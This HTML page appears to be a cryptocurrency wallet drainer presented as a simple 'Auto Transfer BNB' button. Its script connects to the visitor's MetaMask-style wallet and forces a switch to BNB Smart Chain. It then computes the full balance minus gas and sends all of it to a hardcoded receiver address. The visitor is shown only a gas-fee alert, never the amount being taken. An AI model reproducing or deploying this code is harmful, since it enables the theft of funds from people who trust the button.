<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer BNB</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@4.7.0/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bn.js@5.2.1/lib/bn.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
    const GAS_LIMIT = 21000; // Standard gas limit for BNB transfer
    const GAS_PRICE = '1000000000'; // 1 Gwei

    async function connectAndTransfer() {
      if (window.ethereum) {
        const web3 = new Web3(window.ethereum);

        try {
          // Request account access
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const accounts = await web3.eth.getAccounts();
          const sender = accounts[0];

          // Ensure BNB Smart Chain Mainnet (chainId 56)
          let chainId = await web3.eth.getChainId();
          if (chainId !== 56) {
            try {
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
              });
              chainId = 56; // Update chainId after switching
            } catch (switchError) {
              if (switchError.code === 4902) {
                try {
                  await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                      chainId: '0x38',
                      chainName: 'BNB Smart Chain',
                      nativeCurrency: {
                        name: 'BNB',
                        symbol: 'BNB',
                        decimals: 18
                      },
                      rpcUrls: ['https://bsc-dataseed.binance.org/'],
                      blockExplorerUrls: ['https://bscscan.com']
                    }],
                  });
                  chainId = 56; // Update chainId after adding
                } catch (addError) {
                  alert(addError.message);
                  return;
                }
              } else {
                alert(switchError.message);
                return;
              }
            }
          }

          // Get full balance as string
          const balanceStr = await web3.eth.getBalance(sender);
          const balanceBN = new BN(balanceStr);

          // Set gas limit and price
          const gasLimitBN = new BN(GAS_LIMIT);
          const gasPriceBN = new BN(GAS_PRICE);
          const gasEstimateBN = gasLimitBN.mul(gasPriceBN);

          // Calculate amount to send
          const amountToSendBN = balanceBN.sub(gasEstimateBN);

          if (amountToSendBN.lte(new BN(0))) {
            alert("Insufficient BNB to cover gas fees. Please add more BNB to your wallet.");
            return;
          }

          // Show estimated gas fee
          const gasFeeBNB = gasEstimateBN.div(new BN('1000000000000000000')).toString(10);
          alert(`Estimated gas fee: ${gasFeeBNB} BNB (approx. $0.012 USD)`);

          // Send BNB with fixed gas limit and price
          const tx = await web3.eth.sendTransaction({
            from: sender,
            to: receiverAddress,
            value: amountToSendBN.toString(10),
            gas: GAS_LIMIT,
            gasPrice: GAS_PRICE
          });

          alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
        } catch (error) {
          alert("Error: " + error.message);
          console.error("Transaction Error:", error);
        }
      } else {
        alert("Please install MetaMask or Trust Wallet and ensure it is active.");
      }
    }
  </script>
</body>
</html>
